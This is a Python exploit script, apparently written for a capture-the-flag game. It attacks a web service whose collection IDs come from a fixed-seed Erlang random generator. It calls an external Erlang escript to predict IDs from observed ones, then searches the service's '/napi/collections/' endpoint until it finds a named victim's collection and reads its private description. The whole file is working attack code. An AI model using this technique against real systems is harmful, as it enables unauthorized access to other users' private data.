"""
PRNG-predictable vuln: calls an Erlang escript that matches the server's
rand:seed(exsss, {42,43,44}) / rand:bytes(9) / base64url encoding.

Uses exponential + binary search to minimize HTTP requests.
"""

import asyncio
import math
import subprocess
import os
from typing import Optional
import httpx

BURST_SIZE = 1
ESCRIPT_PATH = os.path.join(os.path.dirname(__file__), "crack.erl")


def recover_state(observed: list[str]) -> Optional[list[str]]:
    if not observed:
        return None

    try:
        result = subprocess.run(
            ["escript", ESCRIPT_PATH, *observed],
            capture_output=True, text=True, timeout=10,
            env={**os.environ, "ERL_FLAGS": "-sctp"},
        )
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        raise RuntimeError(f"escript failed: {e}")

    stdout = result.stdout
    clean = "\n".join(
        l for l in stdout.split("\n")
        if not any(w in l for w in ("ESOCK", "ESSIO", "sctp", "Warning:", "Warning "))
        and not l.strip().startswith("%")
    )
    if "not_found" in clean or "validate_failed" in clean:
        msg = clean.strip().split("\n")[0] if clean.strip() else stdout[:200]
        raise RuntimeError(f"escript: {msg}")

    lines = [l.strip() for l in clean.strip().split("\n") if l.strip()]
    if not lines:
        return None
    return lines


async def _check_collection(conn, pid: str, victim_name: str) -> Optional[str]:
    try:
        r = await conn.get(
            f"/napi/collections/{pid}",
            cookies=None,
            timeout=httpx.Timeout(1.0, connect=1.0),
        )
        if r.status_code != 200:
            return None
        data = r.json()
        if data.get("user", {}).get("username", "").lower() != victim_name.lower():
            return None
        return data.get("description") or ""
    except Exception:
        return None


async def find_victim_collection(
    conn,
    predictions: list[str],
    victim_name: str,
    batch_size: int = 50,
) -> Optional[str]:
    if not predictions:
        return None

    n = len(predictions)
    low = 0
    sem = asyncio.Semaphore(batch_size)

    async def check_at(idx: int):
        async with sem:
            if idx >= n:
                return None
            return await _check_collection(conn, predictions[idx], victim_name)

    for exp in range(int(math.log2(n)) + 2):
        idx = min((1 << exp) - 1, n - 1)
        desc = await check_at(idx)
        if desc is not None:
            high = idx
            while low < high:
                mid = (low + high) // 2
                d = await check_at(mid)
                if d is not None:
                    high = mid
                else:
                    low = mid + 1
            return await check_at(low)
        low = idx + 1

    return None
